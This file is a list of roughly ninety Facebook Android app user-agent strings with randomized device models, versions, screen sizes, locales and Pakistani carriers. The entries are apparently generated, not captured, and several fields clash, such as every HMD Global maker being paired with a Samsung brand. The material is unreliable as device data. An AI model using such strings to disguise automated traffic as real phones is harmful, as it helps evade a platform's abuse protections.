"[FBAN/FB4A;FBAV/377.0.0.97.128;FBBV/96783924;FBDM/{density=8.2,width=1194,height=2413};FBLC/en_US;FBRV/71963863;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C105S;FBSV/6.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/223.0.0.82.19;FBBV/84403351;FBDM/{density=3.3,width=792,height=1366};FBLC/en_US;FBRV/52372726;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G360T;FBSV/6.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/77.0.0.25.188;FBBV/96182366;FBDM/{density=5.4,width=932,height=1320};FBLC/en_PK;FBRV/68182884;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G970U1;FBSV/9.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/356.0.0.38.97;FBBV/61044771;FBDM/{density=9.5,width=1447,height=2868};FBLC/en_PK;FBRV/82354865;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung W2015;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/310.0.0.4.14;FBBV/71154867;FBDM/{density=7.6,width=1458,height=1301};FBLC/en_PK;FBRV/82426135;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G550T;FBSV/8.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/225.0.0.67.69;FBBV/45127804;FBDM/{density=4.6,width=1439,height=2078};FBLC/en_GB;FBRV/47772676;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J337VPP;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/252.0.0.78.19;FBBV/57337140;FBDM/{density=5.1,width=1380,height=2563};FBLC/en_US;FBRV/42292141;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A310F;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/179.0.0.44.17;FBBV/92786330;FBDM/{density=4.9,width=678,height=1977};FBLC/en_GB;FBRV/58614106;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G935W8;FBSV/6.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/233.0.0.85.125;FBBV/47822767;FBDM/{density=2.9,width=745,height=1519};FBLC/en_PK;FBRV/32366086;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A135F;FBSV/7.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/380.0.0.81.24;FBBV/16367056;FBDM/{density=7.4,width=1107,height=1523};FBLC/en_US;FBRV/94558245;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G3812B;FBSV/8.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/230.0.0.72.110;FBBV/22226811;FBDM/{density=9.3,width=1195,height=1954};FBLC/en_GB;FBRV/94499072;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A320F;FBSV/8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/419.0.0.33.191;FBBV/44249416;FBDM/{density=9.8,width=909,height=2033};FBLC/en_GB;FBRV/97104150;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J700P;FBSV/6.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/16.0.0.63.35;FBBV/83419534;FBDM/{density=5.6,width=504,height=2472};FBLC/en_GB;FBRV/25599311;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J120H;FBSV/6.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/323.0.0.17.82;FBBV/37034687;FBDM/{density=9.8,width=812,height=1078};FBLC/en_US;FBRV/15713806;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N900P;FBSV/8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/109.0.0.63.52;FBBV/13100810;FBDM/{density=5.1,width=687,height=2048};FBLC/en_GB;FBRV/38808586;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G800F;FBSV/8.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/361.0.0.34.130;FBBV/16906986;FBDM/{density=3.4,width=1146,height=2219};FBLC/en_US;FBRV/72864094;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A5009;FBSV/7.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/84.0.0.80.16;FBBV/75238682;FBDM/{density=9.4,width=1465,height=1651};FBLC/en_PK;FBRV/61324253;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S337TL;FBSV/8.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/259.0.0.8.187;FBBV/55011067;FBDM/{density=2.2,width=1306,height=2571};FBLC/en_GB;FBRV/18710859;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J510FN;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/276.0.0.46.56;FBBV/22332209;FBDM/{density=9.6,width=1057,height=1564};FBLC/en_US;FBRV/21869239;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A715F;FBSV/8.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/407.0.0.25.167;FBBV/95253532;FBDM/{density=1.6,width=1181,height=1546};FBLC/en_PK;FBRV/88928688;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J260G;FBSV/7.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/31.0.0.96.132;FBBV/75552913;FBDM/{density=4.8,width=882,height=1301};FBLC/en_GB;FBRV/79768524;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J700F;FBSV/7.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/128.0.0.76.44;FBBV/84967214;FBDM/{density=5.3,width=848,height=1707};FBLC/en_GB;FBRV/95713541;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G7102;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/229.0.0.60.169;FBBV/15285087;FBDM/{density=1.4,width=1382,height=2291};FBLC/en_GB;FBRV/40496580;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M336K;FBSV/7.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/95.0.0.43.96;FBBV/62138503;FBDM/{density=4.8,width=1090,height=1639};FBLC/en_US;FBRV/22493016;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A022F;FBSV/6.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/37.0.0.49.69;FBBV/70976639;FBDM/{density=1.3,width=1115,height=2165};FBLC/en_PK;FBRV/19800501;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J106F;FBSV/6.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/87.0.0.43.19;FBBV/30258529;FBDM/{density=7.1,width=1114,height=2685};FBLC/en_US;FBRV/50685071;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G155S;FBSV/8.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/207.0.0.5.119;FBBV/79182303;FBDM/{density=6.7,width=1041,height=1535};FBLC/en_US;FBRV/24173007;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J415FN;FBSV/8.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/121.0.0.87.109;FBBV/67012441;FBDM/{density=1.7,width=743,height=2065};FBLC/en_US;FBRV/84331217;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A336E;FBSV/7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/340.0.0.57.131;FBBV/84213959;FBDM/{density=5.5,width=1452,height=2712};FBLC/en_GB;FBRV/48050261;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A013G;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/325.0.0.10.51;FBBV/44198019;FBDM/{density=4.3,width=962,height=2387};FBLC/en_US;FBRV/65135499;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G988U1;FBSV/7.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/329.0.0.68.194;FBBV/18146776;FBDM/{density=4.8,width=1278,height=2566};FBLC/en_US;FBRV/32173450;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J727V;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/349.0.0.31.95;FBBV/71151762;FBDM/{density=5.4,width=1000,height=2247};FBLC/en_PK;FBRV/25381147;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G988B;FBSV/7.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/29.0.0.57.118;FBBV/77848613;FBDM/{density=1.3,width=678,height=2224};FBLC/en_PK;FBRV/33163988;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M307FN;FBSV/8.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/190.0.0.1.91;FBBV/84155748;FBDM/{density=4.5,width=1072,height=1663};FBLC/en_US;FBRV/52045561;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G850F;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/184.0.0.15.151;FBBV/43390604;FBDM/{density=8.5,width=1227,height=2545};FBLC/en_PK;FBRV/42668241;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G3586V;FBSV/9.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/421.0.0.42.182;FBBV/22356214;FBDM/{density=1.2,width=1136,height=2745};FBLC/en_US;FBRV/66072250;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N986W;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/412.0.0.94.34;FBBV/30075218;FBDM/{density=7.5,width=935,height=1854};FBLC/en_GB;FBRV/26563435;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G550FY;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/85.0.0.8.120;FBBV/69615396;FBDM/{density=2.2,width=670,height=1018};FBLC/en_GB;FBRV/53386723;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S124DL;FBSV/8.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/279.0.0.43.102;FBBV/76686374;FBDM/{density=2.1,width=653,height=1073};FBLC/en_US;FBRV/82262816;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J106B;FBSV/8.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/368.0.0.97.84;FBBV/34131430;FBDM/{density=1.1,width=1238,height=1642};FBLC/en_US;FBRV/49894547;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A500XZ;FBSV/7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/246.0.0.37.36;FBBV/91882772;FBDM/{density=5.5,width=1302,height=2350};FBLC/en_GB;FBRV/29258254;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N930x;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/20.0.0.17.156;FBBV/71008546;FBDM/{density=9.6,width=646,height=1878};FBLC/en_PK;FBRV/43653888;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G5108;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/292.0.0.64.61;FBBV/94249742;FBDM/{density=7.6,width=1460,height=2949};FBLC/en_PK;FBRV/45257358;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung F900F;FBSV/8.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/228.0.0.95.109;FBBV/67921578;FBDM/{density=4.5,width=1097,height=2534};FBLC/en_PK;FBRV/18951564;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J320H;FBSV/6.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/61.0.0.61.154;FBBV/37677532;FBDM/{density=4.9,width=1421,height=2691};FBLC/en_US;FBRV/46600829;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G318HZ;FBSV/7.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/105.0.0.93.27;FBBV/63761413;FBDM/{density=3.7,width=1473,height=1870};FBLC/en_GB;FBRV/77752678;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J510MN;FBSV/7.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/69.0.0.20.180;FBBV/81277824;FBDM/{density=2.3,width=1001,height=2328};FBLC/en_US;FBRV/60426032;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N750L;FBSV/8.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/320.0.0.38.152;FBBV/93555278;FBDM/{density=5.2,width=619,height=1292};FBLC/en_GB;FBRV/18149569;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A102U1;FBSV/7.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/203.0.0.72.34;FBBV/89753475;FBDM/{density=5.3,width=1255,height=2841};FBLC/en_GB;FBRV/82431204;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J337VPP;FBSV/8.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/137.0.0.92.133;FBBV/28869090;FBDM/{density=9.9,width=850,height=1863};FBLC/en_GB;FBRV/77018948;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N9008V;FBSV/8.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/75.0.0.90.65;FBBV/64803990;FBDM/{density=1.9,width=1336,height=2539};FBLC/en_PK;FBRV/46002131;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J810M;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/286.0.0.93.147;FBBV/58770730;FBDM/{density=1.8,width=733,height=2529};FBLC/en_GB;FBRV/22111920;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J337AZ;FBSV/6.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/225.0.0.46.6;FBBV/93275570;FBDM/{density=5.1,width=691,height=2862};FBLC/en_GB;FBRV/11277589;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J410F;FBSV/8.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/416.0.0.85.26;FBBV/72440675;FBDM/{density=3.1,width=1380,height=2907};FBLC/en_US;FBRV/95655441;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G920S;FBSV/7.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/38.0.0.94.51;FBBV/17781963;FBDM/{density=9.2,width=830,height=2776};FBLC/en_GB;FBRV/36265606;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G870W;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/38.0.0.5.49;FBBV/82355224;FBDM/{density=8.3,width=1414,height=1284};FBLC/en_PK;FBRV/73894108;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A528B;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/171.0.0.46.112;FBBV/29897748;FBDM/{density=6.7,width=1039,height=1896};FBLC/en_US;FBRV/33766783;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N970U1;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/10.0.0.24.35;FBBV/98518263;FBDM/{density=2.3,width=1057,height=2727};FBLC/en_PK;FBRV/15339675;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G935T;FBSV/8.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/315.0.0.79.155;FBBV/87755577;FBDM/{density=1.1,width=1077,height=2819};FBLC/en_PK;FBRV/17186117;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G885F;FBSV/7.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/66.0.0.93.149;FBBV/11534063;FBDM/{density=8.4,width=913,height=1244};FBLC/en_US;FBRV/17948517;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M205F;FBSV/8.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/406.0.0.29.182;FBBV/12378087;FBDM/{density=4.8,width=724,height=2886};FBLC/en_GB;FBRV/96699458;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J410G;FBSV/8.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/420.0.0.36.100;FBBV/61580806;FBDM/{density=1.7,width=819,height=2236};FBLC/en_GB;FBRV/84868070;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J710GN;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/244.0.0.90.178;FBBV/82794142;FBDM/{density=7.6,width=1414,height=2243};FBLC/en_GB;FBRV/21680187;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M205FN;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/230.0.0.73.59;FBBV/48059709;FBDM/{density=8.3,width=525,height=1488};FBLC/en_GB;FBRV/81695923;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G316M;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/69.0.0.70.192;FBBV/37542507;FBDM/{density=5.7,width=775,height=1005};FBLC/en_US;FBRV/49145526;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N986B;FBSV/6.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/180.0.0.78.21;FBBV/69786055;FBDM/{density=6.5,width=1184,height=2703};FBLC/en_GB;FBRV/27736042;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N9208;FBSV/7.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/106.0.0.7.187;FBBV/72160068;FBDM/{density=1.3,width=950,height=2301};FBLC/en_GB;FBRV/37542074;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S908N;FBSV/8.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/379.0.0.18.42;FBBV/45219292;FBDM/{density=7.2,width=808,height=2404};FBLC/en_PK;FBRV/28552683;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G950F;FBSV/9.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/339.0.0.32.182;FBBV/96836304;FBDM/{density=7.5,width=1370,height=1938};FBLC/en_US;FBRV/29734338;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N7502;FBSV/8.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/223.0.0.79.194;FBBV/42683823;FBDM/{density=7.2,width=1337,height=2753};FBLC/en_GB;FBRV/55529310;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A510Y;FBSV/8.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/60.0.0.42.82;FBBV/75378496;FBDM/{density=4.7,width=1011,height=2220};FBLC/en_US;FBRV/97539201;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S906U1;FBSV/6.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/224.0.0.56.159;FBBV/79338451;FBDM/{density=3.9,width=1332,height=2577};FBLC/en_PK;FBRV/13790743;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J415FN;FBSV/9.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/384.0.0.29.53;FBBV/55181831;FBDM/{density=6.4,width=647,height=1695};FBLC/en_US;FBRV/96255360;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A226L;FBSV/6.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/154.0.0.32.16;FBBV/71338839;FBDM/{density=7.5,width=1233,height=1953};FBLC/en_PK;FBRV/37475852;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G6000;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/364.0.0.80.59;FBBV/79580375;FBDM/{density=4.9,width=1074,height=2241};FBLC/en_GB;FBRV/79914025;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G360F;FBSV/8.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/131.0.0.22.121;FBBV/70659077;FBDM/{density=5.2,width=1408,height=2118};FBLC/en_PK;FBRV/28988314;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G3508J;FBSV/8.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/360.0.0.39.101;FBBV/24096001;FBDM/{density=8.1,width=583,height=1234};FBLC/en_GB;FBRV/99811740;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G800H;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/162.0.0.67.99;FBBV/15374403;FBDM/{density=9.7,width=1020,height=1050};FBLC/en_GB;FBRV/86495122;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N930x;FBSV/7.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/260.0.0.54.199;FBBV/35215803;FBDM/{density=4.2,width=1430,height=1082};FBLC/en_US;FBRV/61250535;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N920C;FBSV/6.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/220.0.0.78.176;FBBV/88363957;FBDM/{density=7.6,width=869,height=2564};FBLC/en_GB;FBRV/69029709;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung E500F;FBSV/6.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/430.0.0.15.119;FBBV/18295220;FBDM/{density=2.4,width=1284,height=1405};FBLC/en_PK;FBRV/17434018;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung T255S;FBSV/9.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/124.0.0.10.131;FBBV/80052574;FBDM/{density=9.2,width=1290,height=2092};FBLC/en_PK;FBRV/78899477;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G600F;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/192.0.0.81.195;FBBV/44446280;FBDM/{density=2.7,width=734,height=2002};FBLC/en_US;FBRV/38964186;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G928C;FBSV/7.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/34.0.0.30.137;FBBV/46877172;FBDM/{density=3.8,width=1311,height=1361};FBLC/en_GB;FBRV/59862226;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A500XZ;FBSV/7.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/286.0.0.26.160;FBBV/57160005;FBDM/{density=7.5,width=1154,height=2248};FBLC/en_PK;FBRV/85119409;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N915FY;FBSV/6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/347.0.0.98.46;FBBV/92939948;FBDM/{density=3.1,width=1011,height=1141};FBLC/en_GB;FBRV/18843897;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G600S;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/94.0.0.79.6;FBBV/53292212;FBDM/{density=9.6,width=554,height=1897};FBLC/en_PK;FBRV/93339448;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A716U;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/307.0.0.70.98;FBBV/47317650;FBDM/{density=2.2,width=624,height=1919};FBLC/en_GB;FBRV/43176214;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J737T1;FBSV/8.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/238.0.0.14.82;FBBV/47158656;FBDM/{density=8.2,width=868,height=2117};FBLC/en_GB;FBRV/63317918;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A226L;FBSV/6.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/274.0.0.30.197;FBBV/41644887;FBDM/{density=6.9,width=1071,height=2996};FBLC/en_US;FBRV/75750147;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G610S;FBSV/6.7;FBOP/1;FBCA/arm64-v8a:;]"
